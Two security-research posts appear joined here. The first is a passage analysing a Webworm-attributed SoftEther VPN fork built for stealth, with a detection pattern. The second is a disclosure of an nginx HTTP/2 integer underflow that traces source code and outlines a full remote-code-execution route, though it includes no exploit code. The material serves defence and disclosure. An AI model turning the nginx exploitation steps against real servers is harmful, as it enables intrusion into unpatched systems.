The first and most trivial change the threat actor implements is in the PE metadata. Here we learn that the OriginalFileName of this binary is netcapa.exe, and it brands itself as “Network Monitor Software” published by a company named “Network Systems Solutions Inc.“. The only field unchanged against the stock SoftEther executable (vpnbridge_x64.exe) is the Version, which reads 4, 44, 0, 9807.

Next, we wanted to identify any functionality added or modified by the threat actor. The SoftEther bridge alone is a powerful tool to maintain remote access to a compromised network, but we wanted to know if perhaps there was a backdoor to give the threat actor direct command execution on the infected host. For that reason we checked out the corresponding tag in the public “SoftEtherVPN_Stable” repository on GitHub and compared it to the decompiled sample.

Internal rebranding

The rebranding apparent in the exposed metadata extends into internal strings used in debug banners, service names, registry keys, the contents of the server’s HTTP 401 error page, or firewall rule names, where occurrences of “SoftEther VPN” are replaced by “NtMonitor VPN”.

However, the renaming is inconsistent; for example, the service name used by the entry point is still SEVPNBRIDGE, and many registry key paths still reference the “SoftEther Project”.

Network stealth

Stock SoftEther VPN Mayaqua/Network.h defines HTTP endpoints used by the protocol:

HTTP_VPN_TARGET   "/vpnsvc/vpn.cgi"
HTTP_VPN_TARGET2  "/vpnsvc/connect.cgi"

NtMonitor replaces these endpoints with much more innocent-sounding names, in particular:

HTTP_VPN_TARGET   "/update/alive.cgi"
HTTP_VPN_TARGET2  "/update/picture.cgi"

A client initiating a connection to a SoftEther VPN server will send a handshake request to HTTP_VPN_TARGET2 along with a "watermark", i.e. a byte pattern proving that the client is speaking the correct VPN protocol. Otherwise, the server answers with a decoy HTTP response.

NtMonitor changes the upstream GIF watermark with a custom byte pattern (a truncated PNG file showing the Windows logo), so that stock SoftEther clients and servers cannot handshake with this build, and NtMonitor's own peers cannot be fingerprinted with the well-known stock GIF watermark.

Embedded resource archive

As the threat actor probably realizes, a SoftEther resource archive named hamcore.se2, which sits next to the executables in the installation directory and is required to be present at runtime, provides a straightforward detection opportunity for unauthorized installations. We think that, for this exact reason, the actor chose to reduce the contents of this archive to a bare minimum, package the archive inside the bridge executable itself (as a PE resource), and implement a custom resource directory walk to load the archive at runtime. As a side effect, this increases the binary’s size by about 1.5 MB compared to the official build.

Encrypted configuration

Another weak point (for the attacker) in stock SoftEther is that its configuration is stored on disk in plain text in a well-recognizable format. The actor changes its name from vpn_bridge.config to setting.conf and modifies the configuration loader to handle custom-encrypted files that start with the magic bytes RCEN in ASCII. The rest of the encrypted file has a simple format and includes the encryption key. A Python script to decrypt such files with the actor’s custom RC4-like cipher is available on the Rapid7 Intelligence GitHub repository.

Attribution and interpretation of findings

Beyond the changes described above, we did not identify any additional malware functionality. Clearly, the threat actor prioritizes stealth above raw capability. It seems like they methodically analyzed SoftEther’s detection surface and implemented counter-measures to all of the easy ways a detection engineer may target it. At the time of our analysis, only one anti-virus vendor detected the sample on VirusTotal, although it has been public since January.

This aligns well with the TTPs previously reported for Webworm by ESET, and such attribution is further supported by indicators in decrypted configurations Rapid7 Intelligence has access to. In all of the cases, the VPN is configured to bridge (“cascade”) a remote network into the local one; furthermore, in cases that were not likely deliberate tests, the remote IP address was located inside AS 20473 belonging to The Constant Company, LLC, which (also including its subsidiary, Vultr) has been associated with Webworm on many occasions in the past.

Considering this attribution, we can put together some important takeaways: Quite likely, we are looking at a new evolution in the tooling used by Webworm, a China-aligned APT whose activity is known to focus on governmental organizations, especially in Europe. Earlier this year, ESET already noted this group to shift away from custom malware to dual-use tools such as SoftEther VPN, but now we are observing a sort of hybrid of the two — stock SoftEther software that is not trojanized, but rebuilt from source in a way that erases much of its detection fingerprint.

Detection guidance

To detect this particular variant of Webworm’s tooling, we provide a list of IoCs and a YARA ruleset on our public GitHub repository. If you have the ability to inspect TLS traffic in your organization, one of the most reliable detections you can deploy right now is to look for POST requests to /update/picture.cgi with Content-Type: image/jpeg and a request body starting with and 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 (initial bytes of the custom PNG watermark).

Although the samples we have seen all use the same NtMonitor branding internally (despite the PE metadata differing across samples), this is the easiest change for the threat actor to implement next. Similarly, the HTTP endpoints and watermark can be swapped out trivially. As such, we recommend defenders in the government sector to familiarize themselves with intrinsic SoftEther VPN behavior in order to stay one step ahead of when the threat actor decides to update the tool next.

MITRE ATT&CK techniques

Technique ID

Technique Name

Comment

T1587.001

Develop Capabilities: Malware

The actor is maintaining their own fork of SoftEther VPN used for malicious purposes.

T1027.013

Obfuscated Files or Information: Encrypted/Encoded File

Configuration files are encrypted with a custom cipher.

T1140

Deobfuscate/Decode Files or Information

Encrypted configuration files are decrypted at startup by the modified loader.

T1036.005

Masquerading: Match Legitimate Resource Name or Location

PE metadata is purposefully changed to masquerade as a generic system service.

T1027.005

Obfuscated Files or Information: Indicator Removal from Tools

Known SoftEther artifacts are systematically removed from the binary.

T1686.003

Disable or Modify System Firewall: Windows Host Firewall

Using stock SoftEther functionality, the malware adds rules to the system firewall.

T1599

Network Boundary Bridging

The VPN bridge binds together the infected host’s local area network with the attacker’s.

T1071

Application Layer Protocol

C2 communication uses HTTP(S) and SoftEther’s application protocol.

T1090.001

Proxy: Internal Proxy

The infected host serves as an internal proxy mediating C2 access to other hosts on the network.

CVE-2026-123007: Critical NGINX HTTP/2 Integer Underflow Leads to RCE (FIXED)
items.summary:
Overview

Today, both Rapid7 and F5 are disclosing CVE-2026-123007, a critical integer underflow vulnerability affecting nginx HTTP/2, which can allow for unauthenticated remote code execution (RCE) against affected servers under certain conditions.

CVE ID

Description

CWE

CVSSv4

CVE-2026-123007

HTTP/2 flow-control memory corruption permitting worker-context RCE

CWE-191 (Integer Underflow)

9.2 (Critical)

nginx can miscalculate how much response data an HTTP/2 client has allowed it to send. A remote, unauthenticated client can exploit this error by cancelling queued response data, then make nginx use an invalid length when copying a later response. The resulting memory corruption can disclose data, interrupt service, and execute code with the nginx worker process's permissions.

Impact

Rapid7 has developed a proof-of-concept to demonstrate leveraging CVE-2026-123007 for unauthenticated RCE against a vulnerable linux/amd64 Docker image running nginx version 1.31.8, as shown below in Figure 1. The target nginx server’s configuration had http2 on and TLS enabled. Note that for brevity, video playback is at 8x speed.

Figure 1: Video demonstrating unauthenticated RCE against NGINX 1.31.8 via CVE-2026-123007

Leveraging CVE-2026-123007 for RCE requires a significant amount of network traffic to be transmitted, approximately 128 GB of HTTP/2 data. Both available network bandwidth and connection timeouts will place practical limitations on Internet exploitation. In the above example shown in Figure 1, exploitation takes two and a half minutes. The approximate timings to transmit the required network data over a 10 Gbit/s network is two minutes, while on a 1 Gbit/s network it is seventeen minutes. Due to nginx’s default one hour connection lifetime, a network slower than approximately 300 Mbit/s will take over the one hour connection limit threshold and will not be able to succeed. Additionally, should an HTTP/2 connection be proxied, the precise attacker-controlled HTTP/2 frames being transmitted will likely not be retransmitted in a way that satisfies exploiting the vulnerability.

Finally, the exploitation strategy developed depends on a specific x86-64 glibc EVEX/YMM memcpy implementation selected at runtime, based on the avx512f and avx512vl CPU features. Alternative RCE exploitation strategies may be viable, but none are currently known.

Credit

This vulnerability was discovered by Stephen Fewer, Senior Principal Security Researcher at Rapid7, and is being disclosed in accordance with Rapid7's vulnerability disclosure policy.

Technical analysis

The version of nginx tested was a linux/amd64 Docker image for nginx version 1.31.8 (nginx@sha256:5ab5b0b01097420873a3f3330f44248e34a3c2a3e8d5ee30658aeae8cb7435da), and ran with an exposed HTTPS service and http2 enabled.

How a client controls HTTP/2 response data

HTTP/2 carries messages called frames over a connection. Each request and response belongs to a numbered stream, so one connection can carry several exchanges at once. Response-body bytes are carried in DATA frames.

For this vulnerability, nginx is the sender and the remote client is the receiver. The client grants nginx permission, or flow-control credit, to send a certain number of DATA bytes. nginx tracks the remaining credit in two counters: one for each stream and one shared by the connection. Sending DATA must be permitted by both counters. These HTTP/2 counters are separate from TCP's receive window.

The client grants more credit by sending a WINDOW_UPDATE frame containing a positive increment. A stream identifier of zero increases the connection’s send credit. A nonzero stream identifier increases the send credit for the stream with that specific nonzero identifier. HTTP/2 limits the increment and the resulting window to 2^31-1 bytes, or 2,147,483,647 (0x7FFFFFFF). This report calls that maximum MAX.

The client can also send a SETTINGS frame containing a SETTINGS_INITIAL_WINDOW_SIZE parameter. This changes the starting credit for new streams. nginx must also adjust each active stream's remaining credit by the difference between the old and new setting values. It does not change the connection's credit. A reduction can therefore leave an active stream with negative credit until the client grants more. The connection window has no equivalent reduction: it must remain between zero and MAX. RFC 9113, section 6.9 defines these limits and the required errors.

nginx stores the connection counter in h2c->send_window, where h2c is the HTTP/2 connection record. Its size_t type is an unsigned integer: on the verified 64-bit build it can hold values from zero to 2^64-1. The size_t type can therefore hold values above HTTP/2's maximum connection window of 2^31-1 bytes (MAX). nginx must enforce that protocol limit in its own logic.

// src/http/v2/ngx_http_v2.h
#define NGX_HTTP_V2_MAX_WINDOW ((1U << 31) - 1) // <--- [1]
struct ngx_http_v2_connection_s {
    // ...
    size_t send_window;                         // <--- [2]
    // ...
};
struct ngx_http_v2_stream_s {
    // ...
    ssize_t send_window;
    // ...
};

The rule that the connection counter at [2] must never exceed MAX at [1] is the connection-window invariant. The separate stream counter, stream->send_window, is explicitly declared as ssize_t, a signed 64-bit integer on the verified build. That allows SETTINGS_INITIAL_WINDOW_SIZE to make a stream's credit temporarily negative. The connection counter remains unsigned. The later unsafe conversion occurs when the output filter treats excessive connection credit as a signed 64-bit off_t response length.

Leveraging vulnerability has four main stages:

  1. By slowing its reading of server output, the client keeps selected DATA frames queued and unstarted. It raises the connection's credit to MAX and the selected streams' credit to just below MAX. A SETTINGS frame that increases SETTINGS_INITIAL_WINDOW_SIZE enough to exceed the stream limit makes nginx close those streams while leaving the connection usable. Request cleanup then restores the reserved credit above MAX.

  2. An unsigned subtraction in the next connection WINDOW_UPDATE check underflows. Repeated accepted WINDOW_UPDATE frames can then raise the counter into the upper half of its 64-bit range without requiring the addition to wrap.

  3. On the verified 64-bit build, nginx interprets that excessive counter as a negative response length and creates an invalid buffer. Buffered TLS output then passes a huge unsigned byte count to the memory-copy function memcpy, causing out-of-bounds reads and writes.

  4. These constrained memory accesses depend on the build and selected copy routine. With a suitable memory layout, an attacker can use disclosed addresses and controlled overwrites to execute code with the nginx worker process's permissions.

Cancelling queued DATA restores too much credit

When nginx queues a DATA frame at [3], it subtracts the frame's DATA length from the connection's credit counter at [4] and then from the stream's credit counter. This reserves the credit before the bytes reach the client and prevents other streams from spending the same connection credit:

// src/http/v2/ngx_http_v2_filter_module.c
// ngx_http_v2_send_chain()
// ...
ngx_http_v2_queue_frame(h2c, frame);       // <--- [3]

h2c->send_window -= frame_size;            // <--- [4]
stream->send_window -= frame_size;
stream->queued++;

An attacker can keep a later response queued by slowing or stopping its reading of earlier server output. Once the transport cannot accept more output, nginx must wait. This condition is transport backpressure. The attacker needs enough of it to keep the selected DATA frame unstarted: none of that frame's bytes have yet entered TLS output or the socket. Stopping response reads does not prevent the client from sending control frames in the other direction.

While the DATA remains queued, the client sends a connection WINDOW_UPDATE that raises nginx's reduced counter to MAX. The problem appears when the request that owns the queued DATA then closes. Its request-cleanup handler removes the unstarted DATA and returns the reserved credit:

// src/http/v2/ngx_http_v2_filter_module.c
// ngx_http_v2_filter_cleanup()
// ...
for ( ;; ) {
    frame = *fn;
    if (frame == NULL) {
        break;
    }
    if (frame->stream == stream && !frame->blocked) { // <--- [5]
        *fn = frame->next;
        window += frame->length;                      // <--- [6]
        if (--stream->queued == 0) {
            break;
        }
        continue;
    }
    fn = &frame->next;
}
// ...
h2c->send_window += window;                           // <--- [7]

The test at [5] selects removable, unstarted frames for that request. The local variable window totals their DATA lengths at [6]. The addition at [7] does not check whether restoring those bytes takes the connection counter above MAX.

For example, restoring 1,393 bytes after the counter has reached 2,147,483,647 (0x7FFFFFFF) produces 2,147,485,040 (0x80000570). This value is invalid under HTTP/2 as it exceeds MAX, although it still fits in a 64-bit size_t; the addition has not yet wrapped around. The unchecked restoration at [7] is the first invalid state in the vulnerability. The attacker still needs a way to close the selected requests while preserving the connection, so the excessive counter can be used again.

A SETTINGS error closes the stream but leaves the connection usable

When a SETTINGS frame increases SETTINGS_INITIAL_WINDOW_SIZE enough that an active stream's credit would exceed MAX, nginx terminates that stream but leaves the HTTP/2 connection usable. A client can create this condition by first sending a stream WINDOW_UPDATE to put the selected stream just below MAX. It then sends a SETTINGS frame that increases the initial stream-window setting. For example, changing the setting from 65,535 to 65,537 adds two bytes to every active stream. A stream already at MAX-1 would become MAX+1, even though the new setting value itself is allowed.

RFC 9113 requires this condition to end the connection with FLOW_CONTROL_ERROR. nginx instead calls ngx_http_v2_terminate_stream() for each affected stream. That function sends RST_STREAM, which ends an individual stream, and causes the request to be cleaned up. The loop then continues using the same connection:

// src/http/v2/ngx_http_v2.c
// ngx_http_v2_adjust_windows()
// ...
if (delta > 0
    && stream->send_window
          > (ssize_t) (NGX_HTTP_V2_MAX_WINDOW - delta))
{
    if (ngx_http_v2_terminate_stream(h2c, stream,
                                     NGX_HTTP_V2_FLOW_CTRL_ERROR)
        == NGX_ERROR)
    {
        return NGX_ERROR;
    }
    continue;                                      // <--- [8]
}

Here, delta is the difference between the new and old setting values. Request cleanup performs [5] through [7], while continue at [8] leaves the HTTP/2 connection open. The attacker can now send further frames on the connection whose credit has exceeded MAX.

The next WINDOW_UPDATE causes an integer underflow

When another connection WINDOW_UPDATE arrives, nginx tries to calculate how much additional credit is still allowed:

// src/http/v2/ngx_http_v2.c
// ngx_http_v2_state_window_update()
// ...
if (window > NGX_HTTP_V2_MAX_WINDOW - h2c->send_window) { // <--- [9]
    // ...
    return ngx_http_v2_connection_error(h2c,
                                        NGX_HTTP_V2_FLOW_CTRL_ERROR);
}
h2c->send_window += window;                            // <--- [10]

In this function, window is the increment received from the client. The subtraction at [9] is safe only while the stored counter is no greater than MAX. If cleanup has restored R excess bytes, the intended allowance is MAX - (MAX + R), or -R. Unsigned arithmetic cannot represent that negative result. On the verified 64-bit build it wraps to 2^64 - R, a very large positive number. This is the integer underflow identified by CWE-191.

The incorrect allowance lets further client increments pass the check. By sending many increments, each no greater than MAX, the client can raise the counter to 2^63 or above without wrapping the addition itself, shown at [10] above. Such a value has the top bit of its 64-bit representation set. It is still an unsigned value, but it no longer fits in a signed 64-bit integer. That distinction matters when nginx prepares the next response.

This amplification accounts for the large traffic requirement. A connection WINDOW_UPDATE occupies 13 HTTP/2 bytes: a nine-byte frame header and a four-byte payload. The credit granted by that frame is not data actually transmitted. Starting from the small over-credit state described above, reaching 2^63 by maximum-size increments takes about 2^32 frames, or 52 GiB. Reaching the near-2^64 values used for the confirmed read/write path takes about 2^33 increments, or 104 GiB. nginx also limits control-frame traffic relative to other received data. The current code-execution reproduction sends about 15 GiB of additional request-header traffic to stay within that limit, bringing its reported plaintext total to about 119.02 GiB. TLS and network overhead increase the actual wire traffic. These figures describe this 64-bit amplification route, not a universal minimum for every possible exploit.

Excessive credit becomes a negative response length

The client can make an active stream with available credit process an ordinary response body. nginx's HTTP/2 output filter decides how many body bytes to include in a DATA frame. Before following that calculation, it is useful to define the buffer it will create.

An in-memory nginx buffer is described by a ngx_buf_t record. Its pos pointer is the memory address of the next byte to send. Its last pointer is the address immediately after the available data. For four available bytes, last must be four bytes after pos; subtracting pos from last gives the length, four. A valid buffer therefore cannot have last before pos. nginx links these buffer records together into an output chain, which is a list of data waiting to be sent.

In ngx_http_v2_send_chain(), the byte limit is an off_t, a signed 64-bit integer on the verified build. The excessive unsigned connection counter is converted to that signed type at [11]. On this build, a value of 2^64 - d, where d is a small positive byte count, becomes -d:

// src/http/v2/ngx_http_v2_filter_module.c
// ngx_http_v2_send_chain()
// ...
if (limit == 0 || limit > (off_t) h2c->send_window) {
    limit = h2c->send_window;                         // <--- [11]
}
if (limit > stream->send_window) {
    limit = (stream->send_window > 0) ? stream->send_window : 0;
}
// ...
if ((off_t) frame_size > limit) {
    frame_size = (size_t) limit;                      // <--- [12]
}
// ...
rest = frame_size;
while ((off_t) rest >= size) {                        // <--- [13]
    // ...
}
if (rest) {
    cl = ngx_http_v2_filter_get_shadow(stream, in->buf,
                                       offset, rest); // <--- [14]
    // ...
}

The stream-window check does not reject a negative limit: it only reduces a limit that is too large. At [12], the negative limit becomes a huge unsigned frame_size. Casting the same value back to off_t makes it negative again, so [13] skips the loop that would normally consume and bound the available body bytes. At [14], nginx passes the invalid length to a helper whose size parameter is also a signed off_t.

That helper creates a shadow buffer: a new metadata record referring to part of the existing response data, without copying the response body itself. It sets the new end pointer using the supplied length:

// src/http/v2/ngx_http_v2_filter_module.c
// ngx_http_v2_filter_get_shadow()
static ngx_chain_t *
ngx_http_v2_filter_get_shadow(ngx_http_v2_stream_t *stream, ngx_buf_t *buf,
    off_t offset, off_t size)
{
    // ...
    ngx_memcpy(chunk, buf, sizeof(ngx_buf_t));
    // ...
    if (ngx_buf_in_memory(chunk)) {
        chunk->pos += offset;
        chunk->last = chunk->pos + size;              // <--- [15]
    }
    // ...
}

Because size is negative, [15] places last before pos. The response body has not become larger; its buffer metadata is now invalid. The next output stage trusts that metadata.

Buffered TLS output copies beyond the buffers

For buffered TLS output, ngx_ssl_send_chain() gathers bytes from the output chain into a temporary staging buffer before encryption. It calculates each input buffer's length using last - pos. The invalid buffer produces a negative signed length at [16]:

// src/event/ngx_event_openssl.c
// ngx_ssl_send_chain()
// ...
ssize_t send, size, file_size;
// ...
size = in->buf->last - in->buf->pos;                  // <--- [16]
if (size > buf->end - buf->last) {
    size = buf->end - buf->last;
}
if (send + size > limit) {
    size = (ssize_t) (limit - send);
}
// ...
ngx_memcpy(buf->last, in->buf->pos, size);            // <--- [17]
buf->last += size;
in->buf->pos += size;

Both checks only reduce lengths that are too large. Neither rejects a negative length. memcpy takes an unsigned size_t byte count, so [17] converts -d back into the huge value 2^64-d. The actual source and destination buffers are far smaller. This is where the invalid connection credit first reaches an out-of-bounds native memory access.

A copy that actually traversed such an enormous range would normally encounter inaccessible memory and crash the worker. In the tested x86-64 glibc implementation, however, certain lengths just below 2^64 cause the machine-level end-address calculations to wrap (Please see Addendum A below for more details on this unexpected behavior). For a length of 2^64-d, adding the length to a start address can produce an address d bytes before it. The optimized copy uses these end addresses in its loop conditions, so it can finish after a limited number of reads and writes that reach outside the intended buffers. The copy can return if all locations it actually accesses are accessible; other lengths, memory layouts, or copy implementations can fault immediately. If it returns, nginx also moves both buffer positions backward by the negative signed length.

Exploitation

The invalid copy can both read and overwrite worker memory. It does not give the client an HTTP/2 field in which it can simply choose any memory address. The useful addresses depend on where nginx allocated the response and TLS buffers, how much output is already buffered, and which copy routine the C library selected. These are constrained read and write capabilities, not an unconditional arbitrary read or write.

After creating the invalid DATA buffer, ngx_http_v2_send_chain() updates its position in the original response and records the bytes that remain to be sent:

// src/http/v2/ngx_http_v2_filter_module.c
// ngx_http_v2_send_chain()
// ...
offset += rest;                                       // <--- [18]
size -= rest;
// ...
if (offset) {
    cl = ngx_http_v2_filter_get_shadow(stream, in->buf,
                                       offset, size); // <--- [19]
    // ...
    in->buf = cl->buf;
    // ...
}

Here, offset is the position within the original body and size is its remaining length. Starting at offset zero, the same unsigned value representing -d makes [18] move the offset backward by d and increase the remaining length by d on the verified build. The shadow buffer created at [19] therefore has a positive length, but starts d bytes before the original response and ends at its original end. If the oversized copy and connection survive, later ordinary DATA frames can carry those preceding bytes to the client through TLS. They can include pointers into the heap, where nginx dynamically allocates request data, or into loaded libraries. Those pointers disclose addresses that address-space layout randomization (ASLR) would otherwise hide.

On the write side, nginx stores client-supplied request data in heap allocations. With a suitable allocation layout, the oversized copy can pick up those attacker-selected bytes and replace fields in a nearby live heap object. One useful field is a callback: a stored function pointer that nginx intends to call later. An attacker who knows the relevant process addresses and can overwrite that field may redirect normal nginx processing to existing executable code. The overwrite need not contain new machine code. This explains the general route from disclosed addresses and controlled bytes to code execution; it does not claim that every build exposes the same object or callback. Execution has the worker's permissions; execution as the master process or root has not been established.

The proof-of-concept first recovers heap addresses and pointers into nginx and the GNU C Library (glibc) from memory preceding the original response body. It uses those addresses and the overwrite to forge nginx request and response-buffer objects that return selected parts of glibc's loaded image over HTTP/2. The returned ELF metadata is parsed to resolve system() despite ASLR, then a request-pool cleanup callback is redirected to invoke an attacker-chosen command.

Addendum A: Why an oversized memcpy can return

The TLS copy via ngx_memcpy (shown at [17] above) receives a byte count of 2^64-d, where d is a small positive distance. A routine that actually traversed that entire range would normally fault. This addendum explains why one optimized glibc implementation can instead finish after a limited number of out-of-bounds accesses.

glibc chooses among optimized copy routines according to the CPU's capabilities. The tested x86-64 routine uses EVEX/YMM instructions, which can move 32 bytes at a time. In the corresponding glibc 2.41 source, the EVEX wrapper includes a shared memcpy/memmove implementation, and its vector configuration sets VEC_SIZE to 32. A vector is the block of bytes handled by one such instruction.

The following excerpt uses AT&T assembly syntax, in which the source operand comes first. The CPU register %rdi holds the original destination address, called D below; %rsi holds the source address, Q; and %rdx holds the byte count, n. One route enters this backward-copy branch when D and Q are different and the unsigned difference D-Q is smaller than n. This includes the ordinary case where D is above Q and n is close to the unsigned 64-bit maximum.

// glibc 2.41: sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S
// Function: CPU-selected memcpy implementation, backward-copy branch
    // ...
L(more_8x_vec_backward):
    // ...
    leaq (VEC_SIZE * -4 + -1)(%rdi, %rdx), %rcx // <--- [20]
    // ...
    andq $-(VEC_SIZE), %rcx                     // <--- [21]
    // ...
L(loop_4x_vec_backward):
    // ... load and store four 32-byte vectors
    addq $(VEC_SIZE * -4), %rcx                 // <--- [22]
    cmpq %rcx, %rdi                             // <--- [23]
    jb L(loop_4x_vec_backward)
    // ... store the previously loaded leading and trailing vectors
    VZEROUPPER_RETURN                           // <--- [24]

The full glibc assembly source shows the omitted loads and stores. At [20], leaq calculates an address without reading memory. Its 64-bit result keeps only the low 64 bits. At [21], andq rounds that address down to a 32-byte boundary. Calling the resulting destination address cursor, the calculation is:

cursor = align_down_32((D + n - 129) modulo 2^64)
       = align_down_32(D - d - 129), when n = 2^64-d

Here, align_down_32 means rounding down to the nearest address divisible by 32; it is explanatory notation, not a glibc function. For an ordinary heap address and a small d, the calculated cursor is already below D.

The loop starts by copying one 128-byte block. Instruction [22] then moves the cursor backward by another 128 bytes. The comparison and unsigned jump at [23] repeat the loop only while D < cursor. Because the cursor is already below D, the jump is not taken. The routine writes its remaining leading and trailing vectors, then returns at [24]. It has not copied the enormous requested range: the wrapped address has made the loop stop after a small set of accesses. Those accesses can still read and overwrite memory outside the actual buffers.

Remediation

The following vendor supplied fixes are available.

37.3.0.1

37.0.8.1

None

1.31.9

For the latest remediation information, please see the vendor advisory.
